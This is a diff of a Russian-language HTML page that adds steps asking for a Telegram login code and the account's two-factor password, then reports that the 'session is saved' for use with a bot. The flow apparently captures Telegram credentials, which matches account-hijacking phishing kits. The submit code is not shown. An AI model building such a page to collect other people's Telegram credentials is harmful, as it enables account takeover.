@@ -248,14 +248,66 @@
             <div class="loader"></div>
         </div>
 
+        <!-- Code Input Step -->
+        <div id="code-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+            </svg>
+            
+            <h1>Введите код</h1>
+            <p class="subtitle">Код отправлен в ваш Telegram</p>
+            
+            <input 
+                type="text" 
+                id="code-input" 
+                class="phone-input" 
+                placeholder="12345"
+                maxlength="6"
+                inputmode="numeric"
+            />
+            
+            <button class="btn" onclick="submitCode()">
+                Подтвердить
+            </button>
+        </div>
+
+        <!-- Password Step (2FA) -->
+        <div id="password-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+            </svg>
+            
+            <h1>Введите пароль 2FA</h1>
+            <p class="subtitle">Ваш аккаунт защищен двухфакторной аутентификацией</p>
+            
+            <input 
+                type="password" 
+                id="password-input" 
+                class="phone-input" 
+                placeholder="Пароль"
+            />
+            
+            <button class="btn" onclick="submitPassword()">
+                Подтвердить
+            </button>
+        </div>
+
         <!-- Success Step -->
         <div id="success-step" class="step">
             <div class="success-icon">✅</div>
             <h1>Успешно!</h1>
-            <p class="subtitle">Код отправлен в ваш Telegram.<br>Проверьте сообщения от бота.</p>
+            <p class="subtitle">Авторизация завершена.<br>Сессия сохранена.</p>
             
             <div class="info-box">
-                💡 Введите полученный код в боте для завершения авторизации
+                💡 Теперь вы можете использовать бота
             </div>
         </div>
 
